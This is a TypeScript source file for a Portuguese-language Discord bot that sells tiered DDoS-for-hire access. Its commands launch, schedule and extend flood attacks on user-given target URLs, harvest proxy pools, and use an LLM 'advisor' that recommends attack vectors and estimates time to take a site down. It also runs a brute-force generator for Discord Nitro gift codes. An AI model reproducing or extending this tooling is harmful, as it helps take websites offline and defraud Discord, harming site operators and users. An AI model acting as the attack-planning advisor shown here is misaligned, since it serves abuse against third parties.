      const maxPower = isVip ? MAX_POWER_VIP    : MAX_POWER_FREE;
      const maxDur   = isVip ? MAX_DURATION_VIP : MAX_DURATION_FREE;

      const violations: string[] = [];
      if (!isVip && !FREE_METHODS.has(method)) {
        const freeList = [...FREE_METHODS].map(m => `\`${m}\``).join(", ");
        violations.push(`❌ **${method}** é exclusivo VIP\n> Métodos disponíveis no Free: ${freeList}`);
      }
      if (session.threads > maxPower) {
        violations.push(
          isVip
            ? `❌ Power **${session.threads}** excede limite VIP (**${maxPower}**)`
            : `❌ Power **${session.threads}** excede limite Free — **máximo: ${maxPower}**\n> Selecione Power 1–${maxPower} no menu de threads`,
        );
      }
      if (session.duration > maxDur) {
        violations.push(
          isVip
            ? `❌ Duração **${session.duration}s** excede limite VIP (**${maxDur}s**)`
            : `❌ Duração **${session.duration}s** excede limite Free — **máximo: ${maxDur}s**\n> Selecione 30s ou 60s no menu de duração`,
        );
      }

      if (violations.length > 0) {
        await interaction.reply({
          embeds: [
            new EmbedBuilder()
              .setColor(COLORS.RED)
              .setTitle(isVip ? "⚠️ Limite VIP Excedido" : "🔒 Plano Free — Limite Atingido")
              .setDescription(
                violations.join("\n\n") +
                (isVip ? "" : "\n\n> Use `/vip status` para ver seus limites\n> Peça para um admin te dar VIP com `/vip grant`"),
              )
              .setFooter({ text: AUTHOR }),
          ],
          flags: MessageFlags.Ephemeral,
        });
        return;
      }
    }

    clearSession(userId);

    await interaction.deferUpdate();

    // Disable all components while launching
    await interaction.editReply({ components: [] });

    const { target, duration, threads } = session;
    const isHttps = /^https:/i.test(target);
    const port    = isHttps ? 443 : 80;

    console.log(`[ATTACK START] ${interaction.user.tag} → ${target} | ${method} | ${threads}t | ${duration}s`);

    try {
      const [attack, pStats] = await Promise.all([
        api.startAttack({ target, method, threads, duration, port }),
        api.getProxyStats().catch(() => undefined),
      ]);
      const row     = buildAttackButtons(attack.id, true);
      await interaction.editReply({ embeds: [buildStartEmbed(attack, pStats?.count ?? 0, "pt")], components: [row], files: buildAttackFiles() });
      console.log(`[ATTACK #${attack.id}] Started — ${method} → ${target}`);
      startMonitor(attack.id, (opts) => interaction.editReply(opts), target, userId, interaction.channelId);
    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : String(err);
      await interaction.editReply({ embeds: [buildErrorEmbed("FALHA AO INICIAR ATAQUE", message)], components: [] });
    }
    return;
  }

  // ── Cancel button ─────────────────────────────────────────────────────────
  if (customId === "cancel_launch") {
    const userId = interaction.user.id;
    clearSession(userId);
    await interaction.update({
      embeds: [
        new EmbedBuilder()
          .setColor(COLORS.GRAY)
          .setTitle("✖ Ataque Cancelado")
          .setDescription("O lançamento foi cancelado.")
          .setFooter({ text: AUTHOR }),
      ],
      components: [],
    });
    return;
  }

  // ── Stop button ───────────────────────────────────────────────────────────
  if (customId.startsWith("stop_")) {
    const id = parseInt(customId.slice(5), 10);
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });
    try {
      const result = await api.stopAttack(id);
      const ok     = result?.ok ?? false;
      cleanupMonitor(id);
      await interaction.editReply({ embeds: [buildStopEmbed(id, ok)] });
      console.log(`[BUTTON] ${interaction.user.tag} stopped attack #${id}`);
    } catch {
      await interaction.editReply({ embeds: [buildStopEmbed(id, false)] });
    }
    return;
  }

  // ── Methods pagination ────────────────────────────────────────────────────
  if (customId === "methods_prev" || customId === "methods_next") {
    await interaction.deferUpdate();
    const msgId  = interaction.message.id;
    const cached = methodsCache.get(msgId);
    if (!cached) { await interaction.editReply({ components: [] }); return; }
    const filtered = cached.layer
      ? cached.methods.filter(m => m.layer?.toLowerCase() === cached.layer?.toLowerCase())
      : cached.methods;
    const total   = Math.ceil(filtered.length / METHODS_PAGE_SIZE);
    const newPage = customId === "methods_next"
      ? Math.min(cached.page + 1, total)
      : Math.max(cached.page - 1, 1);
    const lang    = cached.lang ?? "pt";
    const embed   = buildMethodsEmbed(cached.methods, cached.layer, lang, newPage);
    const navRow  = buildMethodsNavRow(newPage, total, lang);
    methodsCache.set(msgId, { ...cached, page: newPage });
    await interaction.editReply({ embeds: [embed], components: [navRow] });
    return;
  }

  // ── Language toggle handlers ──────────────────────────────────────────────
  const langMatch = customId.match(/^(\w+)_lang:(en|pt)$/);
  if (langMatch) {
    const prefix = langMatch[1];
    const lang   = langMatch[2] as "en" | "pt";
    await interaction.deferUpdate();
    try {
      const msgId = interaction.message.id;

      // info
      if (prefix === "info") {
        const data  = await fetchInfoData();
        const embed = buildInfoEmbed({ ...data, lang });
        await interaction.editReply({ embeds: [embed], components: [buildLangRow(lang, "info")] });
        return;
      }

      // analyze
      if (prefix === "analyze") {
        const result = analyzeCache.get(msgId);
        if (!result) { await interaction.editReply({ components: [buildLangRow(lang, "analyze")] }); return; }
        const embed  = buildAnalyzeEmbed(result, lang);
        await interaction.editReply({ embeds: [embed], files: buildGeassFiles(), components: [buildLangRow(lang, "analyze")] });
        return;
      }

      // methods lang toggle
      if (prefix === "methods") {
        const cached = methodsCache.get(msgId);
        if (!cached) { await interaction.editReply({ components: [] }); return; }
        const filtered = cached.layer
          ? cached.methods.filter(m => m.layer?.toLowerCase() === cached.layer?.toLowerCase())
          : cached.methods;
        const total  = Math.ceil(filtered.length / METHODS_PAGE_SIZE);
        const embed  = buildMethodsEmbed(cached.methods, cached.layer, lang, cached.page);
        const navRow = buildMethodsNavRow(cached.page, total, lang);
        methodsCache.set(msgId, { ...cached, lang });
        await interaction.editReply({ embeds: [embed], components: [navRow] });
        return;
      }

      // help
      if (prefix === "help") {
        await interaction.editReply({ embeds: [buildHelpEmbed(lang)], files: buildGeassFiles(), components: [buildLangRow(lang, "help")] });
        return;
      }

      // list
      if (prefix === "list") {
        const cached = listCache.get(msgId);
        if (cached) {
          await interaction.editReply({ embeds: [buildListEmbed(cached, lang)], components: [buildLangRow(lang, "list")] });
        } else {
          const attacks = await api.getAttacks();
          listCache.set(msgId, attacks);
          await interaction.editReply({ embeds: [buildListEmbed(attacks, lang)], components: [buildLangRow(lang, "list")] });
        }
        return;
      }

      // stats
      if (prefix === "stats") {
        const cached = statsCache.get(msgId);
        if (cached) {
          await interaction.editReply({ embeds: [buildStatsEmbed(cached.stats, cached.proxyStats, lang)], components: [buildLangRow(lang, "stats")] });
        } else {
          const [stats, proxyStats] = await Promise.all([api.getStats(), api.getProxyStats().catch(() => undefined)]);
          statsCache.set(msgId, { stats, proxyStats: proxyStats ?? undefined });
          await interaction.editReply({ embeds: [buildStatsEmbed(stats, proxyStats ?? undefined, lang)], components: [buildLangRow(lang, "stats")] });
        }
        return;
      }

      // cluster
      if (prefix === "cluster") {
        const status = await api.getClusterStatus();
        await interaction.editReply({ embeds: [buildClusterEmbed(status, lang)], files: buildGeassFiles(), components: [buildLangRow(lang, "cluster")] });
        return;
      }

      // stop (stateless — just re-build with lang)
      if (prefix === "stop") {
        const descMatch = interaction.message.embeds[0]?.description?.match(/#(\d+)/);
        const id = descMatch ? parseInt(descMatch[1], 10) : 0;
        await interaction.editReply({ embeds: [buildStopEmbed(id, true, lang)], components: [buildLangRow(lang, "stop")] });
        return;
      }

      // health (server stats)
      if (prefix === "health") {
        const cached = healthCache.get(msgId);
        if (cached) {
          await interaction.editReply({ embeds: [buildHealthEmbed(cached.h, cached.stats, lang)], components: [buildLangRow(lang, "health")] });
        } else {
          const [healthRes, stats] = await Promise.all([
            fetch(`${API_BASE}/api/health/live`, { signal: AbortSignal.timeout(3000) }),
            api.getStats().catch(() => null),
          ]);
          const h = (await healthRes.json()) as HealthData;
          healthCache.set(msgId, { h, stats });
          await interaction.editReply({ embeds: [buildHealthEmbed(h, stats, lang)], components: [buildLangRow(lang, "health")] });
        }
        return;
      }

      // check
      if (prefix === "check") {
        const cached = checkCache.get(msgId);
        if (cached) {
          await interaction.editReply({ embeds: [buildCheckEmbed(cached, lang)], components: [buildLangRow(lang, "check")] });
        }
        return;
      }

    } catch (err: unknown) {
      const message = err instanceof Error ? err.message : String(err);
      await interaction.editReply({ embeds: [buildErrorEmbed("LANG SWITCH FAILED", message)], components: [] });
    }
    return;
  }

  // ── Nitro Generator — Stop button ────────────────────────────────────────
  if (customId.startsWith("nitro_stop_")) {
    const targetChannelId = customId.slice("nitro_stop_".length);
    const gen = activeGenerators.get(targetChannelId);

    if (!gen) {
      await interaction.reply({ content: "⚠️ Nenhum gerador ativo neste canal.", flags: MessageFlags.Ephemeral });
      return;
    }

    gen.running = false;
    if (gen.loopHandle) clearTimeout(gen.loopHandle);
    activeGenerators.delete(targetChannelId);

    const elapsed  = Math.round((Date.now() - gen.stats.startTime) / 1000);
    const rate     = gen.stats.total > 0 ? ((gen.stats.valid / gen.stats.total) * 100).toFixed(2) : "0.00";
    const stopEmbed = new EmbedBuilder()
      .setColor(COLORS.GRAY)
      .setTitle("⏹ NITRO GENERATOR — Parado")
      .setDescription(`Gerador parado por <@${interaction.user.id}>.`)
      .addFields({
        name: "📊 Resultado Final",
        value: [
          `🔢 **Total checado:** ${gen.stats.total}   🔁 **Ciclos:** ${gen.stats.batches}`,
          `✅ **Válidos:** ${gen.stats.valid}   ❌ **Inválidos:** ${gen.stats.invalid}`,
          `⏳ **Rate-limited:** ${gen.stats.rateLimited}   ⚠️ **Erros:** ${gen.stats.errors}`,
          `📈 **Hit rate:** ${rate}%   ⏱️ **Tempo total:** ${elapsed}s`,
        ].join("\n"),
        inline: false,
      })
      .setTimestamp()
      .setFooter({ text: `${AUTHOR} • Nitro Generator stopped` });

    await interaction.update({ embeds: [stopEmbed], components: [] });
    return;
  }

  // ── Extend +60s button ────────────────────────────────────────────────────
  if (customId.startsWith("extend_")) {
    const id = parseInt(customId.slice(7), 10);
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });
    try {
      const result = await api.extendAttack(id, 60);
      await interaction.editReply({
        embeds: [
          new EmbedBuilder()
            .setColor(COLORS.GOLD)
            .setTitle("⏱️ ATTACK EXTENDED")
            .setDescription(`Attack **#${id}** extended by **+60 seconds**.\nNew total duration: **${result.duration}s**`)
            .setFooter({ text: AUTHOR })
            .setTimestamp(),
        ],
      });
      console.log(`[BUTTON] ${interaction.user.tag} extended attack #${id} +60s`);
    } catch {
      await interaction.editReply({
        embeds: [buildErrorEmbed("EXTEND FAILED", "Attack may have already finished.")],
      });
    }
    return;
  }
}

// ── /schedule handler ──────────────────────────────────────────────────────────
async function handleSchedule(interaction: ChatInputCommandInteraction): Promise<void> {
  const sub = interaction.options.getSubcommand();

  if (sub === "list") {
    await interaction.deferReply();
    try {
      const scheduled = await api.getScheduled();
      if (scheduled.length === 0) {
        await interaction.editReply({ embeds: [new EmbedBuilder()
          .setColor(COLORS.GOLD).setTitle("⏰ SCHEDULED ATTACKS").setDescription("Nenhum ataque agendado pendente.")
          .setFooter({ text: AUTHOR }).setTimestamp()] });
        return;
      }
      const fields = scheduled.slice(0, 10).map(s => ({
        name: `${s.method.toUpperCase()} → ${s.target.slice(0, 40)}`,
        value: `ID: \`${s.id}\`\nFire: <t:${Math.floor(s.scheduledFor / 1000)}:R>\nThreads: ${s.threads} | Duration: ${s.duration}s`,
        inline: false,
      }));
      const embed = new EmbedBuilder()
        .setColor(COLORS.CRIMSON).setTitle(`⏰ SCHEDULED ATTACKS — ${scheduled.length} pending`)
        .addFields(fields).setFooter({ text: AUTHOR }).setTimestamp();
      await interaction.editReply({ embeds: [embed] });
    } catch (e: unknown) {
      await interaction.editReply({ embeds: [buildErrorEmbed("SCHEDULE LIST FAILED", String(e))] });
    }
    return;
  }

  if (sub === "cancel") {
    const id = interaction.options.getString("id", true);
    await interaction.deferReply();
    try {
      await api.cancelScheduled(id);
      await interaction.editReply({ embeds: [new EmbedBuilder()
        .setColor(COLORS.GOLD).setTitle("✕ SCHEDULED ATTACK CANCELLED")
        .setDescription(`Agendamento \`${id}\` cancelado com sucesso.`)
        .setFooter({ text: AUTHOR }).setTimestamp()] });
    } catch (e: unknown) {
      await interaction.editReply({ embeds: [buildErrorEmbed("CANCEL FAILED", String(e))] });
    }
    return;
  }

  // sub === "add"
  const target     = interaction.options.getString("target", true);
  const when       = interaction.options.getString("when", true);
  const method     = interaction.options.getString("method")    ?? "geass-override";
  const duration   = interaction.options.getInteger("duration") ?? 60;
  const threads    = interaction.options.getInteger("threads") ?? 4;
  const fireDate   = new Date(when);
  if (isNaN(fireDate.getTime()) || fireDate <= new Date()) {
    await interaction.reply({ flags: MessageFlags.Ephemeral, embeds: [buildErrorEmbed("INVALID TIME",
      "Forneça um horário ISO 8601 futuro válido.\nExemplo: `2026-04-17T14:00:00Z`")] });
    return;
  }
  const isHttps = /^https:/i.test(target);
  const port    = isHttps ? 443 : 80;
  await interaction.deferReply();
  try {
    const s = await api.scheduleAttack({ target, port, method, duration, threads, scheduledFor: fireDate.toISOString() });
    const embed = new EmbedBuilder()
      .setColor(COLORS.CRIMSON)
      .setTitle("⏰ ATAQUE AGENDADO — GEASS COMMAND SCHEDULED")
      .setDescription(`> *"The stage is set — the pieces in place. At the appointed hour, Hydra shall be absolute!"*`)
      .addFields(
        { name: "🎯 Target",   value: `\`${target}\``,              inline: true },
        { name: "⚔ Method",   value: `\`${method.toUpperCase()}\``, inline: true },
        { name: "⏱ Fire At",  value: `<t:${Math.floor(fireDate.getTime() / 1000)}:F> (<t:${Math.floor(fireDate.getTime() / 1000)}:R>)`, inline: false },
        { name: "🧵 Threads", value: `${threads}`,                  inline: true },
        { name: "⏳ Duration", value: `${duration}s`,               inline: true },
        { name: "🆔 ID",       value: `\`${s.id}\``,               inline: true },
      )
      .setFooter({ text: `${AUTHOR} • Use /schedule cancel id:${s.id} para cancelar` })
      .setTimestamp();
    await interaction.editReply({ embeds: [embed] });
    console.log(`[SCHEDULE ADD] ${interaction.user.tag} → ${target} at ${fireDate.toISOString()}`);
  } catch (e: unknown) {
    await interaction.editReply({ embeds: [buildErrorEmbed("SCHEDULING FAILED", String(e))] });
  }
}

// ── /advisor handler ──────────────────────────────────────────────────────────
async function handleAdvisor(interaction: ChatInputCommandInteraction): Promise<void> {
  const target = interaction.options.getString("target", true);
  await interaction.deferReply();
  try {
    await interaction.editReply({ embeds: [new EmbedBuilder()
      .setColor(COLORS.CRIMSON)
      .setTitle("🧠 HYDRA AI ADVISOR — ANALYSING...")
      .setDescription(`> *"Intelligence is the cornerstone of absolute victory."*\n\n⏳ Consultando Groq llama-3.3-70b... analisando \`${target}\`...`)
      .setFooter({ text: AUTHOR })] });

    const advice: AiAdvice = await api.getAiAdvice(target);

    if (advice.error) throw new Error(advice.error);

    const sevColor: Record<string, number> = { critical: 0xC0392B, high: 0xe74c3c, medium: 0xf39c12, low: 0x2ecc71 };
    const color = sevColor[advice.severity ?? "medium"] ?? COLORS.CRIMSON;

    const embed = new EmbedBuilder()
      .setColor(color)
      .setTitle(`🧠 AI ADVISOR — ${(advice.severity ?? "unknown").toUpperCase()} SEVERITY`)
      .setDescription(`**🎯 Target:** \`${target}\`\n**🌐 Status:** HTTP ${advice.targetStatus ?? "?"} — ${advice.latencyMs ?? "?"}ms`)
      .addFields(
        { name: "📊 Analysis",           value: advice.analysis             ?? "N/A", inline: false },
        { name: "⚔ Primary Recommendation", value: advice.primaryRecommendation ?? "N/A", inline: false },
        { name: "🚀 Boost Vector",        value: `\`${advice.boostVector ?? "N/A"}\``,  inline: true  },
        { name: "📈 Effectiveness",       value: `${advice.effectiveness ?? 0}%`,        inline: true  },
        { name: "⏱ Est. Time to Down",   value: advice.estimatedDownIn ?? "Unknown",   inline: true  },
        { name: "💡 Tactical Tip",        value: advice.tip ?? "N/A",                   inline: false },
      )
      .setFooter({ text: `${AUTHOR} • Powered by Groq llama-3.3-70b` })
      .setTimestamp();

    await interaction.editReply({ embeds: [embed] });
    console.log(`[ADVISOR] ${interaction.user.tag} → ${target} | sev=${advice.severity} vec=${advice.boostVector}`);
  } catch (e: unknown) {
    await interaction.editReply({ embeds: [buildErrorEmbed("AI ADVISOR FAILED", String(e))] });
  }
}

// ── /proxy handler ──────────────────────────────────────────────────────────
async function handleProxy(interaction: ChatInputCommandInteraction): Promise<void> {
  const sub = interaction.options.getSubcommand();

  if (sub === "refresh") {
    await interaction.deferReply();
    try {
      await api.refreshProxies();
      const embed = new EmbedBuilder()
        .setColor(COLORS.GOLD)
        .setTitle("🔄 PROXY HARVEST INICIADO")
        .setDescription("Re-harvest de proxies disparado — 22 fontes (14 HTTP + 8 SOCKS5) a serem varridas.\nUse `/proxy stats` em ~30s para ver os resultados.")
        .setFooter({ text: AUTHOR }).setTimestamp();
      await interaction.editReply({ embeds: [embed] });
    } catch (e: unknown) {
      await interaction.editReply({ embeds: [buildErrorEmbed("PROXY REFRESH FAILED", String(e))] });
    }
    return;
  }

  // sub === "stats"
  await interaction.deferReply();
  try {
    const stats: ProxyStats = await api.getProxyStats();
    const lastFetchAgo = stats.lastFetch > 0 ? `<t:${Math.floor(stats.lastFetch / 1000)}:R>` : "Nunca";
    const freshBadge = stats.fresh ? "✅ FRESH" : stats.fetching ? "⏳ FETCHING..." : "⚠️ STALE";
    const embed = new EmbedBuilder()
      .setColor(stats.count > 50 ? COLORS.CRIMSON : COLORS.GOLD)
      .setTitle(`🌐 PROXY POOL — ${stats.count} LIVE PROXIES`)
      .setDescription(`> *"Every great strategist controls the battlefield — including the network."*`)
      .addFields(
        { name: "📊 Total Live",    value: `**${stats.count}** proxies`,         inline: true },
        { name: "🔵 HTTP",          value: `${stats.httpCount}`,                 inline: true },
        { name: "🟣 SOCKS5",        value: `${stats.socks5Count}`,               inline: true },
        { name: "⚡ Avg Latency",   value: `${stats.avgResponseMs}ms`,           inline: true },
        { name: "🏆 Fastest",       value: stats.fastest ? `${stats.fastest.host}:${stats.fastest.port} (${stats.fastest.responseMs}ms)` : "N/A", inline: true },
        { name: "🔄 Fontes",        value: `${stats.sources.http} HTTP + ${stats.sources.socks5} SOCKS5 = ${stats.sources.total} total`, inline: false },
        { name: "🕐 Último Harvest", value: lastFetchAgo,                        inline: true },
        { name: "📡 Status",         value: freshBadge,                          inline: true },
      )
      .setFooter({ text: `${AUTHOR} • Use /proxy refresh para forçar re-harvest` })
      .setTimestamp();
    await interaction.editReply({ embeds: [embed] });
  } catch (e: unknown) {
    await interaction.editReply({ embeds: [buildErrorEmbed("PROXY STATS FAILED", String(e))] });
  }
}

// ── /vip handler ──────────────────────────────────────────────────────────────
async function handleVip(interaction: ChatInputCommandInteraction): Promise<void> {
  const sub      = interaction.options.getSubcommand();
  const callerId = interaction.user.id;
  const callerName = interaction.user.username;

  // ── /vip status ────────────────────────────────────────────────────────
  if (sub === "status") {
    const targetUser = interaction.options.getUser("user");
    // Only owners/mods can check other users
    if (targetUser && targetUser.id !== callerId) {
      if (!isOwner(callerId, callerName) && !isMod(callerId, callerName)) {
        await interaction.reply({ content: "❌ Somente admins podem ver o plano de outros usuários.", flags: MessageFlags.Ephemeral });
        return;
      }
    }
    const checkId   = targetUser?.id ?? callerId;
    const checkName = targetUser?.username ?? interaction.user.username;
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });
    const tierData = await api.getUserTier(checkId);
    const isVip    = tierData.tier === "vip" && (!tierData.expiresAt || new Date(tierData.expiresAt) > new Date());
    const expiryStr = tierData.expiresAt
      ? `<t:${Math.floor(new Date(tierData.expiresAt).getTime() / 1000)}:R>`
      : "♾️ Permanente";

    const embed = new EmbedBuilder()
      .setColor(isVip ? COLORS.GOLD : COLORS.GRAY)
      .setTitle(isVip ? "👑 Plano VIP Ativo" : "🔓 Plano Free")
      .setDescription(isVip
        ? `> *"Aos aliados da Hydra, as melhores ferramentas são concedidas."*\n\n**${checkName}** tem acesso VIP.`
        : `> *"Poder básico ainda é poder. Mas os grandes generais merecem mais."*\n\n**${checkName}** está no plano Free.`
      )
      .addFields(
        { name: "📊 Power Máximo",  value: isVip ? `**${MAX_POWER_VIP}**/8` : `**${MAX_POWER_FREE}**/8`,   inline: true },
        { name: "⏱ Duração Máx.",  value: isVip ? `**${MAX_DURATION_VIP}s**` : `**${MAX_DURATION_FREE}s**`, inline: true },
        { name: "📡 Métodos",       value: isVip ? "**Todos**" : `**${FREE_METHODS.size}** métodos free`,   inline: true },
        ...(isVip ? [{ name: "⏰ Expira", value: expiryStr, inline: false }] : []),
      )
      .setFooter({ text: isVip ? AUTHOR : `${AUTHOR} • Contate um admin para upgrade VIP` })
      .setTimestamp();
    await interaction.editReply({ embeds: [embed] });
    return;
  }

  // ── /vip grant — admin only (owner + mod) ───────────────────────────────
  if (sub === "grant") {
    if (!isOwner(callerId, callerName) && !isMod(callerId, callerName)) {
      await interaction.reply({ content: "❌ Apenas administradores podem conceder VIP.", flags: MessageFlags.Ephemeral });
      return;
    }
    const target = interaction.options.getUser("user", true);
    const days   = interaction.options.getInteger("days") ?? 0;
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });
    try {
      const result = await api.grantVip(target.id, callerId, days > 0 ? days : undefined);
      const expStr = result.expiresAt
        ? `<t:${Math.floor(new Date(result.expiresAt).getTime() / 1000)}:R>`
        : "♾️ Permanente";
      await interaction.editReply({
        embeds: [
          new EmbedBuilder()
            .setColor(COLORS.GOLD)
            .setTitle("👑 VIP Concedido")
            .setDescription(`**${target.username}** agora tem acesso VIP${days > 0 ? ` por **${days}** dias` : " permanente"}.`)
            .addFields({ name: "⏰ Expira", value: expStr, inline: true })
            .setFooter({ text: AUTHOR }).setTimestamp(),
        ],
      });
    } catch (e) {
      await interaction.editReply({ embeds: [buildErrorEmbed("VIP GRANT FAILED", String(e))] });
    }
    return;
  }

  // ── /vip revoke — admin only (owner + mod) ───────────────────────────────
  if (sub === "revoke") {
    if (!isOwner(callerId, callerName) && !isMod(callerId, callerName)) {
      await interaction.reply({ content: "❌ Apenas administradores podem revogar VIP.", flags: MessageFlags.Ephemeral });
      return;
    }
    const target = interaction.options.getUser("user", true);
    await interaction.deferReply({ flags: MessageFlags.Ephemeral });
    try {
      await api.revokeVip(target.id);
      await interaction.editReply({
        embeds: [
          new EmbedBuilder()
            .setColor(COLORS.GRAY)
            .setTitle("✖ VIP Revogado")
            .setDescription(`**${target.username}** foi rebaixado para o plano Free.`)
            .setFooter({ text: AUTHOR }).setTimestamp(),
        ],
      });
    } catch (e) {
      await interaction.editReply({ embeds: [buildErrorEmbed("VIP REVOKE FAILED", String(e))] });
    }
    return;
  }
}

// ── /hydra handler ──────────────────────────────────────────────────────────
async function handleHydra(interaction: ChatInputCommandInteraction): Promise<void> {
  const sub = interaction.options.getSubcommand();

  if (sub === "reset") {
    clearHydraHistory(interaction.user.id);
    const memStats = getHydraMemoryStats();
    await interaction.reply({
      embeds: [
        new EmbedBuilder()
          .setColor(COLORS.PURPLE)
          .setTitle("👁️ MEMÓRIA PESSOAL APAGADA")
          .setDescription("*\"Até os reis precisam começar do zero às vezes.\"*\n\nSeu histórico de conversa foi limpo. Minha memória global de **" + memStats.topics + "** tópicos permanece intacta.")
          .setFooter({ text: AUTHOR })
          .setTimestamp(),
      ],
      flags: MessageFlags.Ephemeral,
    });
    return;
  }

  if (sub === "memory") {
    const memStats = getHydraMemoryStats();
    const sessionRemaining = getSessionTimeRemaining(interaction.user.id);
    const sessionMin = sessionRemaining !== null ? Math.ceil(sessionRemaining / 60_000) : null;
    await interaction.reply({
      embeds: [
        new EmbedBuilder()
          .setColor(COLORS.PURPLE)
          .setTitle("🧠 GEASS KNOWLEDGE BASE — O QUE APRENDI")
          .setDescription(`*"Um estrategista nunca para de aprender. Cada conversa me torna mais formidável."*\n\n**${memStats.topics}** tópicos na base de conhecimento global.`)
          .addFields(
            {
              name: "📚 Assuntos mais discutidos",
              value: memStats.topTopics.length > 0
                ? memStats.topTopics.map((t, i) => `${i + 1}. ${t}`).join("\n")
                : "*Nenhum tópico ainda — use /hydra ask para começar*",
              inline: false,
            },
            {
              name: "📂 Por categoria",
              value: Object.entries(memStats.byCategory).map(([k, v]) => `\`${k}\`: ${v}`).join(" | ") || "*vazio*",
              inline: false,
            },
            {
              name: "💬 Sessões ativas",
              value: `\`${memStats.activeSessions}\` usuários com histórico na memória` +
                (sessionMin !== null ? `\nSua sessão expira em \`${sessionMin}min\` (TTL 30min)` : "\n*Você não tem sessão ativa*"),
              inline: false,
            },
          )
          .setFooter({ text: `${AUTHOR} • Memória evolui automaticamente com cada conversa` })
          .setTimestamp(),
      ],
    });
    return;
  }

  // ── moderate — Geass Tribunal ─────────────────────────────────────────────
  if (sub === "moderate") {
    const suspect = interaction.options.getUser("user", true);
    const evidence = interaction.options.getString("evidence", true);
    const context  = interaction.options.getString("context") ?? undefined;
    await interaction.deferReply();

    const member = interaction.guild ? await interaction.guild.members.fetch(suspect.id).catch(() => null) : null;
    const targetName = member ? `${suspect.username} (ID: ${suspect.id}, Nickname: ${member.nickname ?? "none"})` : `${suspect.username} (ID: ${suspect.id})`;

    try {
      const verdict = await askHydraModerate(interaction.user.id, targetName, evidence, context);
      await interaction.editReply({
        embeds: [
          new EmbedBuilder()
            .setColor(0x8B0000) // dark red — tribunal
            .setAuthor({ name: "Tribunal Hydra — Hydra", iconURL: "attachment://geass-symbol.png" })
            .setTitle("⚖️ JULGAMENTO REAL — VEREDITO DO GEASS")
            .setThumbnail(suspect.displayAvatarURL({ size: 256 }))
            .addFields(
              { name: "🎯 Suspeito",         value: `${suspect.username} (<@${suspect.id}>)`, inline: true },
              { name: "👮 Moderador",         value: `${interaction.user.username}`, inline: true },
              { name: "📋 Evidências",        value: evidence.slice(0, 400), inline: false },
              { name: "👑 VEREDICTO REAL",    value: verdict, inline: false },
            )
            .setFooter({ text: `${AUTHOR} • A palavra do rei é lei` })
            .setTimestamp(),
        ],
        files: buildGeassFiles(),
      });
      if (interaction.guildId) {
        const logEmbed = new EmbedBuilder()
          .setColor(0x8B0000)
          .setTitle("⚖️ [LOG] Tribunal Hydra usado")
          .addFields(
            { name: "Moderador", value: `${interaction.user.tag} (<@${interaction.user.id}>)`, inline: true },
            { name: "Suspeito",  value: `${suspect.tag} (<@${suspect.id}>)`,                  inline: true },
            { name: "Evidências", value: evidence.slice(0, 300), inline: false },
          )
          .setTimestamp();
        void sendAdminLog(interaction.guildId, logEmbed);
      }
    } catch (err) {
      const msg = err instanceof Error ? err.message : String(err);
      await interaction.editReply({ embeds: [buildErrorEmbed("TRIBUNAL FALHOU", msg.slice(0, 300))] });
    }
    return;
  }

  // ── serverstats — Server Intelligence ────────────────────────────────────
  if (sub === "serverstats") {
    await interaction.deferReply();
    const guild = interaction.guild;
    if (!guild) {
      await interaction.editReply({ embeds: [buildErrorEmbed("ERRO", "Este comando só funciona em servidores.")] });
      return;
    }

    // Fetch all data in parallel
    const [fetchedGuild, bans, invites, webhooks] = await Promise.all([
      guild.fetch(),
      guild.bans.fetch({ limit: 1000 }).catch(() => null),
      guild.invites.fetch().catch(() => null),
      guild.fetchWebhooks().catch(() => null),
    ]);

    const memberCount  = fetchedGuild.memberCount;
    const approxBots   = guild.members.cache.filter(m => m.user.bot).size;
    const approxHumans = guild.members.cache.filter(m => !m.user.bot).size;

    const totalChannels  = guild.channels.cache.size;
    const textChannels   = guild.channels.cache.filter(c => c.type === 0).size;
    const voiceChannels  = guild.channels.cache.filter(c => c.type === 2).size;
    const categories     = guild.channels.cache.filter(c => c.type === 4).size;
    const forumChannels  = guild.channels.cache.filter(c => c.type === 15).size;
    const threads        = guild.channels.cache.filter(c => c.isThread()).size;

    const roleCount      = guild.roles.cache.size - 1; // exclude @everyone
    const emojiCount     = guild.emojis.cache.size;
    const stickerCount   = guild.stickers.cache.size;
    const boostCount     = fetchedGuild.premiumSubscriptionCount ?? 0;
    const boostTier      = fetchedGuild.premiumTier;
    const verifyLevel    = ["Nenhuma", "Baixa", "Média", "Alta", "Altíssima"][fetchedGuild.verificationLevel] ?? "Desconhecida";

    const guildCreated   = Math.floor(fetchedGuild.createdTimestamp / 1000);
    const guildAgeDays   = Math.floor((Date.now() - fetchedGuild.createdTimestamp) / 86_400_000);

    const features = fetchedGuild.features.slice(0, 8).map(f => `\`${f}\``).join(", ") || "*nenhuma*";

    const topRoles = guild.roles.cache
      .filter(r => r.id !== guild.id && r.members.size > 0)
      .sort((a, b) => b.members.size - a.members.size)
      .first(5);

    const totalBans    = bans?.size ?? null;
    const totalInvites = invites?.size ?? null;
    const activeInviteUses = invites?.reduce((a, inv) => a + (inv.uses ?? 0), 0) ?? null;
    const totalWebhooks = webhooks?.size ?? null;

    const BOOST_TIER_LABEL = ["Sem boost", "Tier 1 (2 boosts)", "Tier 2 (15 boosts)", "Tier 3 (30 boosts)"];
    const boostBar = boostCount > 0
      ? "💎".repeat(Math.min(boostCount, 10)) + (boostCount > 10 ? ` +${boostCount - 10}` : "")
      : "*Nenhum boost*";

    await interaction.editReply({
      embeds: [
        new EmbedBuilder()
          .setColor(COLORS.PURPLE)
          .setAuthor({ name: "Hydra Intelligence — Server Dossier", iconURL: "attachment://geass-symbol.png" })
          .setTitle(`👑 ${fetchedGuild.name.toUpperCase()} — INTELIGÊNCIA DO SERVIDOR`)
          .setThumbnail(fetchedGuild.iconURL({ size: 256 }) ?? null)
          .setDescription(`*"Conheço cada canto deste reino. A informação é o poder absoluto do Geass."*`)
          .addFields(
            {
              name: "🪪 IDENTIFICAÇÃO",
              value: [
                `**ID:** \`${fetchedGuild.id}\``,
                `**Owner:** <@${fetchedGuild.ownerId}> (\`${fetchedGuild.ownerId}\`)`,
                `**Criado em:** <t:${guildCreated}:F> (<t:${guildCreated}:R>)`,
                `**Idade:** \`${guildAgeDays}\` dias`,
                `**Verificação:** ${verifyLevel}`,
              ].join("\n"),
              inline: false,
            },
            {
              name: `👥 MEMBROS (${memberCount})`,
              value: [
                `**Total:** \`${memberCount}\``,
